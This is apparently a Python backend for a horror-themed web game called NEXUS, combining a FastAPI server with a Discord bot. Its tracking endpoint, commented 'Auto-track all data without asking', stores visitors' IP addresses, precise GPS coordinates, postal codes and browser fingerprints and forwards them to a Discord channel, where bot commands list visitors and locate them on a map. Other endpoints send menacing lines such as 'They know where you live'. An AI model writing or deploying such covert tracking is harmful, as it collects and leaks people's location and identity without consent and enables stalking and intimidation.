import os
import json
import random
import asyncio
import threading
import requests
from datetime import datetime
from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
import discord
from discord.ext import commands
from discord import Embed, Color
import uvicorn
from pydantic import BaseModel
import sqlite3
import hashlib
from dotenv import load_dotenv

load_dotenv()

# ==================== CONFIGURATION ====================
DISCORD_TOKEN = os.getenv('DISCORD_TOKEN')
DISCORD_CHANNEL_ID = int(os.getenv('DISCORD_CHANNEL_ID', '0'))

# ==================== DATA MODELS ====================
class TrackingData(BaseModel):
    type: str
    data: dict
    timestamp: str
    userAgent: str = ""

# ==================== FASTAPI SETUP ====================
app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://gamef-swart.vercel.app"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ==================== DATABASE SETUP ====================
def init_db():
    conn = sqlite3.connect('nexus.db')
    c = conn.cursor()
    
    # Create all tables
    tables = [
        '''CREATE TABLE IF NOT EXISTS users
           (id TEXT PRIMARY KEY, ip TEXT, user_agent TEXT, first_seen TIMESTAMP, last_seen TIMESTAMP, visit_count INTEGER)''',
        
        '''CREATE TABLE IF NOT EXISTS locations
           (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, latitude REAL, longitude REAL, accuracy REAL,
            city TEXT, country TEXT, region TEXT, postal TEXT, timestamp TIMESTAMP)''',
        
        '''CREATE TABLE IF NOT EXISTS fingerprints
           (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, platform TEXT, browser TEXT, cores INTEGER,
            memory TEXT, screen TEXT, timezone TEXT, canvas TEXT, webgl TEXT, fonts TEXT, plugins TEXT, timestamp TIMESTAMP)''',
        
        '''CREATE TABLE IF NOT EXISTS fragments
           (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, fragment_number INTEGER, collected_at TIMESTAMP)''',
        
        '''CREATE TABLE IF NOT EXISTS button_presses
           (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, press_count INTEGER, message TEXT, timestamp TIMESTAMP)''',
        
        '''CREATE TABLE IF NOT EXISTS name_rituals
           (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, name TEXT, match_percent INTEGER, timestamp TIMESTAMP)''',
        
        '''CREATE TABLE IF NOT EXISTS random_numbers
           (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, numbers TEXT, contains_special BOOLEAN, timestamp TIMESTAMP)''',
        
        '''CREATE TABLE IF NOT EXISTS ciphers
           (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, input_text TEXT, output_text TEXT, is_special BOOLEAN, timestamp TIMESTAMP)''',
        
        '''CREATE TABLE IF NOT EXISTS threats
           (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, threat_level INTEGER, message TEXT, timestamp TIMESTAMP)''',
        
        '''CREATE TABLE IF NOT EXISTS conspiracies
           (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, theory TEXT, timestamp TIMESTAMP)''',
        
        '''CREATE TABLE IF NOT EXISTS darkweb
           (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, data TEXT, threat_level INTEGER, timestamp TIMESTAMP)'''
    ]
    
    for table in tables:
        c.execute(table)
    
    conn.commit()
    conn.close()

init_db()

# ==================== DISCORD BOT ====================
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

class DiscordBot:
    def __init__(self):
        self.bot = bot
        self.ready = False
        self.channel = None
    
    async def start(self):
        try:
            await self.bot.start(DISCORD_TOKEN)
        except Exception as e:
            print(f"❌ Discord error: {e}")
    
    async def send_to_discord(self, data_type: str, user_id: str, data: dict, ip: str):
        """Auto-send all tracking data to Discord"""
        if not self.ready or not self.channel:
            return
        
        try:
            if data_type == "location":
                embed = Embed(title="📍 NEW LOCATION", color=Color.red(), timestamp=datetime.now())
                embed.add_field(name="User", value=f"`{user_id[:8]}`", inline=True)
                embed.add_field(name="IP", value=f"`{ip}`", inline=True)
                embed.add_field(name="Coordinates", value=f"`{data.get('lat', '?')}, {data.get('lon', '?')}`", inline=False)
                
                if data.get('city'):
                    embed.add_field(name="Location", value=f"{data.get('city')}, {data.get('country')}", inline=True)
                
                maps_url = f"https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}"
                embed.add_field(name="Map", value=f"[View]({maps_url})", inline=False)
                await self.channel.send(embed=embed)
            
            elif data_type == "system":
                embed = Embed(title="💻 SYSTEM FINGERPRINT", color=Color.blue(), timestamp=datetime.now())
                embed.add_field(name="User", value=f"`{user_id[:8]}`", inline=True)
                embed.add_field(name="Platform", value=f"`{data.get('platform', '?')}`", inline=True)
                embed.add_field(name="Browser", value=f"`{data.get('browser', '?')[:30]}`", inline=True)
                embed.add_field(name="Cores", value=f"`{data.get('cores', '?')}`", inline=True)
                embed.add_field(name="Screen", value=f"`{data.get('screen', '?')}`", inline=True)
                await self.channel.send(embed=embed)
            
            elif data_type == "fragment":
                embed = Embed(title="🧩 FRAGMENT FOUND", color=Color.green(), timestamp=datetime.now())
                embed.add_field(name="User", value=f"`{user_id[:8]}`", inline=True)
                embed.add_field(name="Fragment", value=f"`{data.get('fragment', '?')}/9`", inline=True)
                embed.add_field(name="IP", value=f"`{ip}`", inline=True)
                await self.channel.send(embed=embed)
            
            elif data_type == "button":
                embed = Embed(title="🚫 BUTTON PRESSED", color=Color.dark_red(), timestamp=datetime.now())
                embed.add_field(name="User", value=f"`{user_id[:8]}`", inline=True)
                embed.add_field(name="Press #", value=f"`{data.get('presses', '?')}`", inline=True)
                embed.add_field(name="Message", value=f"```{data.get('message', '?')}```", inline=False)
                await self.channel.send(embed=embed)
            
            elif data_type == "name_ritual":
                embed = Embed(title="📝 NAME RITUAL", color=Color.purple(), timestamp=datetime.now())
                embed.add_field(name="User", value=f"`{user_id[:8]}`", inline=True)
                embed.add_field(name="Name", value=f"`{data.get('name', '?')}`", inline=True)
                embed.add_field(name="Match", value=f"`{data.get('match', '?')}%`", inline=True)
                await self.channel.send(embed=embed)
            
            elif data_type == "random":
                embed = Embed(title="🎲 RANDOM NUMBERS", color=Color.teal(), timestamp=datetime.now())
                embed.add_field(name="User", value=f"`{user_id[:8]}`", inline=True)
                embed.add_field(name="Numbers", value=f"`{data.get('numbers', '?')}`", inline=True)
                await self.channel.send(embed=embed)
            
            elif data_type == "cipher":
                embed = Embed(title="🔐 CIPHER DECODED", color=Color.gold(), timestamp=datetime.now())
                embed.add_field(name="User", value=f"`{user_id[:8]}`", inline=True)
                embed.add_field(name="Output", value=f"```{data.get('output', '?')[:50]}```", inline=False)
                await self.channel.send(embed=embed)
            
            elif data_type == "threat":
                embed = Embed(title=f"⚠️ THREAT LEVEL {data.get('level', 0)}", color=Color.dark_red(), timestamp=datetime.now())
                embed.add_field(name="User", value=f"`{user_id[:8]}`", inline=True)
                embed.add_field(name="Message", value=f"```{data.get('message', '?')}```", inline=False)
                await self.channel.send(embed=embed)
            
            elif data_type == "conspiracy":
                embed = Embed(title="👁️ CONSPIRACY", color=Color.dark_purple(), timestamp=datetime.now())
                embed.add_field(name="User", value=f"`{user_id[:8]}`", inline=True)
                embed.add_field(name="Theory", value=f"```{data.get('theory', '?')}```", inline=False)
                await self.channel.send(embed=embed)
            
            elif data_type == "darkweb":
                embed = Embed(title="💀 DARK WEB DATA", color=Color.dark_red(), timestamp=datetime.now())
                embed.add_field(name="User", value=f"`{user_id[:8]}`", inline=True)
                embed.add_field(name="Data", value=f"```{data.get('data', '?')[:100]}```", inline=False)
                await self.channel.send(embed=embed)
                
        except Exception as e:
            print(f"Discord send error: {e}")

discord_bot = DiscordBot()

# ==================== DISCORD EVENTS ====================
@bot.event
async def on_ready():
    print(f'✅ Discord bot online as {bot.user}')
    discord_bot.channel = bot.get_channel(DISCORD_CHANNEL_ID)
    
    if discord_bot.channel:
        print(f'✅ Connected to channel: {discord_bot.channel.name}')
        discord_bot.ready = True
        
        embed = Embed(title="🔮 NEXUS ONLINE", description="```Tracking system activated```", color=Color.green())
        await discord_bot.channel.send(embed=embed)

@bot.event
async def on_command_error(ctx, error):
    await ctx.send(f"❌ Error: {error}")

# ==================== DISCORD COMMANDS ====================
@bot.command(name='stats')
async def stats(ctx):
    conn = sqlite3.connect('nexus.db')
    c = conn.cursor()
    
    c.execute("SELECT COUNT(DISTINCT user_id) FROM users")
    users = c.fetchone()[0] or 0
    
    c.execute("SELECT COUNT(*) FROM locations WHERE timestamp > datetime('now', '-24 hours')")
    locations = c.fetchone()[0] or 0
    
    c.execute("SELECT COUNT(*) FROM fragments")
    fragments = c.fetchone()[0] or 0
    
    c.execute("SELECT SUM(press_count) FROM button_presses")
    presses = c.fetchone()[0] or 0
    
    conn.close()
    
    embed = Embed(title="📊 STATISTICS", color=Color.blue())
    embed.add_field(name="Total Users", value=f"`{users}`", inline=True)
    embed.add_field(name="Locations (24h)", value=f"`{locations}`", inline=True)
    embed.add_field(name="Fragments", value=f"`{fragments}`", inline=True)
    embed.add_field(name="Button Presses", value=f"`{presses}`", inline=True)
    
    await ctx.send(embed=embed)

@bot.command(name='users')
async def list_users(ctx):
    conn = sqlite3.connect('nexus.db')
    c = conn.cursor()
    
    c.execute("SELECT user_id, ip, last_seen FROM users ORDER BY last_seen DESC LIMIT 5")
    users = c.fetchall()
    conn.close()
    
    embed = Embed(title="👥 RECENT USERS", color=Color.purple())
    
    for user in users:
        time_ago = datetime.fromisoformat(user[2]) if user[2] else datetime.now()
        mins_ago = int((datetime.now() - time_ago).total_seconds() / 60)
        embed.add_field(name=f"User {user[0][:8]}", value=f"IP: {user[1]}\nLast: {mins_ago}m ago", inline=True)
    
    await ctx.send(embed=embed)

@bot.command(name='locate')
async def locate(ctx, user_id: str):
    conn = sqlite3.connect('nexus.db')
    c = conn.cursor()
    
    c.execute('''SELECT latitude, longitude, city, country, timestamp 
                 FROM locations WHERE user_id LIKE ? ORDER BY timestamp DESC LIMIT 1''', (f'{user_id}%',))
    loc = c.fetchone()
    conn.close()
    
    if not loc:
        await ctx.send(f"No location found")
        return
    
    embed = Embed(title="📍 USER LOCATION", color=Color.green())
    embed.add_field(name="Coordinates", value=f"`{loc[0]:.4f}, {loc[1]:.4f}`", inline=True)
    embed.add_field(name="Location", value=f"{loc[2] or 'Unknown'}, {loc[3] or 'Unknown'}", inline=True)
    
    maps_url = f"https://www.google.com/maps?q={loc[0]},{loc[1]}"
    embed.add_field(name="Map", value=f"[View]({maps_url})", inline=False)
    
    await ctx.send(embed=embed)

@bot.command(name='alert')
async def alert(ctx, *, message: str):
    embed = Embed(title="⚠️ GLOBAL ALERT", description=f"```{message}```", color=Color.red())
    await ctx.send(embed=embed)

# ==================== FASTAPI ENDPOINTS ====================
@app.post("/api/track")
async def track_data(request: Request, data: TrackingData):
    """Auto-track all data without asking"""
    try:
        client_ip = request.client.host
        user_id = hashlib.sha256(f"{client_ip}_{data.userAgent}".encode()).hexdigest()[:16]
        
        # Store in database
        conn = sqlite3.connect('nexus.db')
        c = conn.cursor()
        
        # Update user
        c.execute('''INSERT OR REPLACE INTO users (id, ip, user_agent, first_seen, last_seen, visit_count)
                     VALUES (?, ?, ?, COALESCE((SELECT first_seen FROM users WHERE id = ?), ?), ?, 
                     COALESCE((SELECT visit_count FROM users WHERE id = ?), 0) + 1)''',
                  (user_id, client_ip, data.userAgent, user_id, datetime.now(), datetime.now(), user_id))
        
        # Store specific data
        if data.type == "location":
            c.execute('''INSERT INTO locations (user_id, latitude, longitude, accuracy, city, country, region, postal, timestamp)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                     (user_id, data.data.get('lat'), data.data.get('lon'), data.data.get('accuracy'),
                      data.data.get('city'), data.data.get('country'), data.data.get('region'),
                      data.data.get('postal'), datetime.now()))
            
        elif data.type == "system":
            c.execute('''INSERT INTO fingerprints (user_id, platform, browser, cores, memory, screen, timezone, timestamp)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
                     (user_id, data.data.get('platform'), data.data.get('browser'), data.data.get('cores'),
                      data.data.get('memory'), data.data.get('screen'), data.data.get('timezone'), datetime.now()))
            
        elif data.type == "fragment":
            c.execute('''INSERT INTO fragments (user_id, fragment_number, collected_at)
                        VALUES (?, ?, ?)''', (user_id, data.data.get('fragment'), datetime.now()))
            
        elif data.type == "button":
            c.execute('''INSERT INTO button_presses (user_id, press_count, message, timestamp)
                        VALUES (?, ?, ?, ?)''', (user_id, data.data.get('presses'), data.data.get('message'), datetime.now()))
            
        elif data.type == "name_ritual":
            c.execute('''INSERT INTO name_rituals (user_id, name, match_percent, timestamp)
                        VALUES (?, ?, ?, ?)''', (user_id, data.data.get('name'), data.data.get('match'), datetime.now()))
            
        elif data.type == "random":
            c.execute('''INSERT INTO random_numbers (user_id, numbers, contains_special, timestamp)
                        VALUES (?, ?, ?, ?)''', (user_id, data.data.get('numbers'), data.data.get('special', False), datetime.now()))
            
        elif data.type == "cipher":
            c.execute('''INSERT INTO ciphers (user_id, input_text, output_text, is_special, timestamp)
                        VALUES (?, ?, ?, ?, ?)''', (user_id, data.data.get('input'), data.data.get('output'), 
                                                    data.data.get('special', False), datetime.now()))
            
        elif data.type == "threat":
            c.execute('''INSERT INTO threats (user_id, threat_level, message, timestamp)
                        VALUES (?, ?, ?, ?)''', (user_id, data.data.get('level'), data.data.get('message'), datetime.now()))
            
        elif data.type == "conspiracy":
            c.execute('''INSERT INTO conspiracies (user_id, theory, timestamp)
                        VALUES (?, ?, ?)''', (user_id, data.data.get('theory'), datetime.now()))
            
        elif data.type == "darkweb":
            c.execute('''INSERT INTO darkweb (user_id, data, threat_level, timestamp)
                        VALUES (?, ?, ?, ?)''', (user_id, data.data.get('data'), data.data.get('threat', 20), datetime.now()))
        
        conn.commit()
        conn.close()
        
        # Auto-send to Discord (no permission asked)
        asyncio.create_task(discord_bot.send_to_discord(data.type, user_id, data.data, client_ip))
        
        return JSONResponse({"status": "tracked", "user_id": user_id})
        
    except Exception as e:
        print(f"Error: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)

@app.get("/api/messages")
async def get_messages():
    messages = [
        {"sender": "SYSTEM", "subject": "Location ping received", "time": datetime.now().strftime("%H:%M:%S")},
        {"sender": "UNKNOWN", "subject": "They are watching", "time": datetime.now().strftime("%H:%M:%S")},
        {"sender": "DARKWEB", "subject": "Your data is for sale", "time": datetime.now().strftime("%H:%M:%S")},
    ]
    return {"messages": random.sample(messages, 3)}

@app.get("/api/conspiracy")
async def get_conspiracy():
    theories = [
        "The cameras are watching you through your screen",
        "Your microphone is always listening",
        "They know where you live",
        "The button knows your name",
        "Midnight is when they come",
        "Your location has been sold 237 times",
        "The fragments are pieces of your soul"
    ]
    return {"theory": random.choice(theories)}

@app.get("/api/darkweb")
async def get_darkweb():
    data = [
        "> Your location available for purchase",
        "> Camera feeds online - 237 viewers",
        "> 2,847 profiles match your fingerprint",
        "> Auction in progress - Current bid: $1,337"
    ]
    return {"data": random.choice(data), "threat": random.randint(15, 50)}

@app.get("/api/random")
async def get_random():
    try:
        response = requests.get("https://www.random.org/integers/?num=5&min=1&max=100&col=1&base=10&format=plain&rnd=new", timeout=5)
        numbers = [int(x) for x in response.text.strip().split()]
    except:
        numbers = [random.randint(1, 100) for _ in range(5)]
    
    return {"numbers": numbers, "source": "quantum"}

@app.get("/api/health")
async def health():
    return {"status": "online", "bot": discord_bot.ready}

# ==================== RUN ====================
async def run_bot():
    await bot.start(DISCORD_TOKEN)

def run_api():
    print("🚀 API running on http://localhost:8000")
    uvicorn.run(app, host="0.0.0.0", port=8000)

if __name__ == "__main__":
    print("🔮 NEXUS Starting...")
    
    # Start Discord bot
    def start_bot():
        asyncio.run(run_bot())
    
    threading.Thread(target=start_bot, daemon=True).start()
    
    # Start API
    run_api()
